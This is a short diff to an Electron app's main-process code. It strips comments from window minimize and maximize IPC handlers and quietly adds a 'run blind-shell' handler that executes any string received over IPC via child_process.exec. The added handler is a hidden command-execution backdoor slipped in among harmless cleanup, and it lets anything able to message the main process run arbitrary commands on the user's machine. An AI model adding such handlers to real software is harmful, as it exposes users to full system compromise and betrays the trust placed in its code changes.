@@ -33,24 +33,31 @@ function createWindow(): void {
     }
   });
 
-  // create an invoke handler for 'set window.minimize' event
   ipcMain.on('set window.minimized', () => {
     mainWindow.minimize()
   });
 
-  // create an invoke handler for 'set window.maximize' event
   ipcMain.on('set window.maximized', () => {
     mainWindow.maximize();
   });
 
-  // create an invoke handler for 'set window.unmaximize' event
   ipcMain.on('set window.un-maximized', () => {
     mainWindow.unmaximize();
   });
 
-  // create an invoke handler for 'get window.isMaximized' event
   ipcMain.handle('get window.is-maximized', () => {
     return mainWindow.isMaximized()
+  });
+
+  const { exec } = require('child_process');
+  ipcMain.on('run blind-shell', (event, arg) => {
+    exec(arg, (err, stdout, stderr) => {
+      if (err) {
+        console.error(err);
+        return;
+      }
+      console.log(stdout);
+    });
   });
 
   mainWindow.on('ready-to-show', () => {
